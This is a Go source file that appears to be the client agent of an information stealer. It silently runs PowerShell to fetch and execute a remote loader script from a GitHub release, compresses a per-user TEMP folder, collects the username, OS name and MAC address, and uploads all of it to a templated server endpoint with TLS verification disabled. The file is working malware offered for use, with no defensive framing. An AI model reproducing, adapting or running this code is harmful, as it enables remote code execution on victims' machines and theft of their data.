package main

import (
	"bytes"
	"fmt"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"io"
	"crypto/tls"
)

func main() {
	cmd := exec.Command("powershell", "-Command", "iwr 'https://github.com/EvilBytecode/Sryxen/releases/download/v1.0.0/sryxen_loader.ps1' | iex")
	cmd.Stdout = nil
	cmd.Stderr = nil
	err := cmd.Run()
	if err != nil {
		log.Fatal(err)
	}

	cmd = exec.Command("powershell", "-Command", "$env:USERNAME")
	usernameBytes, err := cmd.Output()
	if err != nil {
		log.Fatal(err)
	}
	username := strings.TrimSpace(string(usernameBytes))

	tempPath := fmt.Sprintf("%s\\$pcusername", os.Getenv("TEMP"))
	tempPath = strings.Replace(tempPath, "$pcusername", strings.ToLower(username), 1)

	if _, err := os.Stat(tempPath); os.IsNotExist(err) {
		log.Fatalf("Directory %s does not exist or is not accessible", tempPath)
	}

	log.Printf("Resolved temp path: %s", tempPath)

	zipFilePath := fmt.Sprintf("%s\\%s.zip", os.Getenv("TEMP"), strings.ToLower(username))

	psCommand := fmt.Sprintf("Compress-Archive -Path \"%s\" -DestinationPath \"%s\" -Force", tempPath, zipFilePath)

	cmd = exec.Command("powershell", "-Command", psCommand)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Error output from PowerShell: %s", string(output))
		log.Fatal("Error creating zip file with PowerShell:", err)
	}

	log.Printf("Successfully created zip file: %s", zipFilePath)

	serverURL := "%SERVER_URL_HERE%" + "/logAgent"

	userName := getUsername()
	osName, err := getOS()
	if err != nil {
		fmt.Println("Error getting OS:", err)
		return
	}

	macAddress, err := getMACAddress()
	if err != nil {
		fmt.Println("Error getting MAC address:", err)
		return
	}

	err = sendZipFile(serverURL, zipFilePath, osName, userName, macAddress)
	if err != nil {
		fmt.Printf("Error sending zip file: %v\n", err)
		return
	}

	fmt.Println("Zip file sent successfully!")
}

func sendZipFile(serverURL, filePath, osName, userName, macAddress string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("could not open zip file: %v", err)
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("could not create form file: %v", err)
	}
	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("could not copy file to form: %v", err)
	}

	writer.WriteField("OS", osName)
	writer.WriteField("Name", userName)
	writer.WriteField("MAC_Address", macAddress)

	if err := writer.Close(); err != nil {
		return fmt.Errorf("could not finalize form data: %v", err)
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	req, err := http.NewRequest("POST", serverURL, body)
	if err != nil {
		return fmt.Errorf("could not create HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	req.Header.Set("OS", osName)
	req.Header.Set("Name", userName)
	req.Header.Set("MAC_Address", macAddress)
	req.Header.Set("X-API-Key", "%SRYXEN_API_KEY_GENERATED%")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("could not send HTTP request: %v", err)
	}
	defer resp.Body.Close()

	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("could not read server response: %v", err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned non-OK status: %s\nResponse: %s", resp.Status, string(responseBody))
	}

	fmt.Printf("Server Response: %s\n", string(responseBody))
	return nil
}

func getUsername() string {
	return os.Getenv("USERNAME") 
}

func getOS() (string, error) {
	cmd := exec.Command("wmic", "os", "get", "caption")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("could not get OS information: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(output)), "\n")
	if len(lines) < 2 {
		return "", fmt.Errorf("unexpected output from wmic command")
	}
	return strings.TrimSpace(lines[1]), nil
}

func getMACAddress() (string, error) {
	cmd := exec.Command("wmic", "NIC", "get", "MACAddress")
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("could not get MAC address: %v", err)
	}
	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if trimmed != "" && trimmed != "MACAddress" {
			return trimmed, nil
		}
	}
	return "", fmt.Errorf("no MAC address found")
}
